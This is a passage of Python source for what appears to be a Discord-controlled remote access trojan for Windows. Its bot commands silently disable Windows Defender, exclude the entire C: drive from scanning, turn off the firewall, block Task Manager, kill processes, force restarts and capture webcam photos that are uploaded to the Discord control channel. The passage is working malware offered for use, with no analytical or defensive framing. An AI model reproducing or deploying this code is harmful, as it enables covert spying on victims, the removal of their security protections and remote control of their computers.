            if response.content.lower() in ["yes", "y"]:
                await ctx.send("Initiating system restart...")
                await asyncio.sleep(1)
                subprocess.run('shutdown /r /t 0', shell=True)
            else:
                await ctx.send("System restart cancelled. UAC changes will apply after next restart.")
        
        except asyncio.TimeoutError:
            await ctx.send("No response received. System restart cancelled. UAC changes will apply after next restart.")
        
    except Exception as e:
        await ctx.send(f"Error disabling UAC: {str(e)}")

# Process kill command
@bot.command()
async def prockill(ctx, *, process_name=None):
    if ctx.channel != ctrl_channel:
        return
    
    if not process_name:
        await ctx.send("Please provide a process name to kill.")
        return
    
    try:
        if not process_name.lower().endswith('.exe'):
            process_name += '.exe'
        
        killed = False
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                if proc.info['name'].lower() == process_name.lower():
                    proc.kill()
                    killed = True
            except:
                pass
        
        if killed:
            await ctx.send(f"Process {process_name} killed successfully.")
        else:
            await ctx.send(f"Process {process_name} not found.")
    except Exception as e:
        await ctx.send(f"Error killing process: {str(e)}")

# Disable Windows Defender command
@bot.command()
async def disabledefender(ctx):
    if ctx.channel != ctrl_channel:
        return
    
    if not admin():
        await ctx.send("Administrative privileges required to disable Windows Defender")
        return
    
    try:
        ps_commands = [
            'Set-MpPreference -DisableRealtimeMonitoring $true',
            'Set-MpPreference -DisableBehaviorMonitoring $true',
            'Set-MpPreference -DisableBlockAtFirstSeen $true',
            'Set-MpPreference -DisableIOAVProtection $true',
            'Set-MpPreference -DisableScriptScanning $true',
            'Add-MpPreference -ExclusionPath "C:\\"',
            'Set-MpPreference -PUAProtection Disabled',
            'Stop-Service -Name WinDefend -Force'
        ]
        
        ps_script = ';'.join(ps_commands)
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        
        process = subprocess.Popen(
            ['powershell.exe', '-Command', ps_script],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE,
            startupinfo=startupinfo
        )
        
        stdout, stderr = process.communicate()
        
        if process.returncode == 0:
            await ctx.send("__**Windows Defender completely disabled**__:\n"
                         "- Real-time protection OFF\n"
                         "- Behavior monitoring OFF\n"
                         "- All scans disabled\n"
                         "- Entire C: drive excluded\n"
                         "- Defender service stopped")
        else:
            error_msg = stderr.decode('utf-8', errors='replace').strip()
            await ctx.send(f"Partial Defender disable\nError: {error_msg[:1000]}")
            
    except Exception as e:
        await ctx.send(f"Critical error during Defender disable: {str(e)[:500]}")

# Disable Windows Firewall command
@bot.command()
async def disablefirewall(ctx):
    if ctx.channel != ctrl_channel:
        return
    
    if not admin():
        await ctx.send("Administrative privileges required to disable Windows Firewall.")
        return
    
    try:
        status_msg = await ctx.send("Attempting to disable Windows Firewall...")
        
        process = subprocess.Popen(
            ["netsh.exe", "advfirewall", "set", "allprofiles", "state", "off"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            shell=False,
            text=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        stdout, stderr = process.communicate(timeout=10)
        
        if process.returncode == 0:
            await status_msg.edit(content="Windows Firewall successfully disabled.")
        else:
            await status_msg.edit(content=f"Failed to disable Windows Firewall.\nError: {stderr}")
            
    except subprocess.TimeoutExpired:
        try:
            process.terminate()
            process.kill()
            try:
                process.wait(timeout=2)
            except subprocess.TimeoutExpired:
                process.kill()
        except Exception as kill_error:
            await ctx.send(f"Note: Could not terminate the firewall process: {str(kill_error)}")
            
        await status_msg.edit(content="Operation timed out while disabling Windows Firewall.")
            
    except Exception as e:
        await ctx.send(f"Error while disabling Windows Firewall: {str(e)}")

# Disable Task Manager command
@bot.command()
async def disabletaskmgr(ctx):
    if ctx.channel != ctrl_channel:
        return
    
    if not admin():
        await ctx.send("Administrative privileges required to disable Task Manager.")
        return
    
    try:
        key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
        registry_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
        winreg.SetValueEx(registry_key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(registry_key)
        
        await ctx.send("Task Manager disabled.")
    except Exception as e:
        await ctx.send(f"Error disabling Task Manager: {str(e)}")

# Enable Task Manager command
@bot.command()
async def enabletaskmgr(ctx):
    if ctx.channel != ctrl_channel:
        return
    
    if not admin():
        await ctx.send("Administrative privileges required to enable Task Manager.")
        return
    
    try:
        key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
        registry_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
        winreg.SetValueEx(registry_key, "DisableTaskMgr", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(registry_key)
        
        await ctx.send("Task Manager enabled.")
    except Exception as e:
        await ctx.send(f"Error enabling Task Manager: {str(e)}")

# Get cameras command
@bot.command()
async def getcams(ctx):
    if ctx.channel != ctrl_channel:
        return
    
    try:
        cameras = []
        index = 0
        while True:
            cap = cv2.VideoCapture(index)
            if not cap.isOpened():
                break
            ret, frame = cap.read()
            if ret:
                cameras.append(f"{index}: {cap.getBackendName()}")
            cap.release()
            index += 1
        
        if cameras:
            await ctx.send("Available cameras:\n" + "\n".join(cameras))
        else:
            await ctx.send("No cameras found.")
    except Exception as e:
        await ctx.send(f"Error getting camera list: {str(e)}")

# Select camera command
@bot.command()
async def selectcam(ctx, camera_index: int = 0):
    global selected_cam
    
    if ctx.channel != ctrl_channel:
        return
    
    try:
        cap = cv2.VideoCapture(camera_index)
        if not cap.isOpened():
            await ctx.send(f"Camera {camera_index} not found.")
            return
        cap.release()
        
        selected_cam = camera_index
        await ctx.send(f"Selected camera {camera_index}.")
    except Exception as e:
        await ctx.send(f"Error selecting camera: {str(e)}")

# Webcam picture command
@bot.command()
async def webcampic(ctx):
    global selected_cam
    
    if ctx.channel != ctrl_channel:
        return
    
    try:
        cap = cv2.VideoCapture(selected_cam)
        if not cap.isOpened():
            await ctx.send(f"Could not open camera {selected_cam}.")
            return
        
        ret, frame = cap.read()
        cap.release()
        
        if not ret:
            await ctx.send("Failed to capture image from webcam.")
            return
        
        image = Image.fromarray(cv2.cvtColor(frame, cv2.COLOR_BGR2RGB))
        
        image_path = "webcam.jpg"
        image.save(image_path)
        
        await ctx.send(file=discord.File(image_path))
        
        os.remove(image_path)
    except Exception as e:
        await ctx.send(f"Error capturing webcam image: {str(e)}")

bot.run(TOKEN)
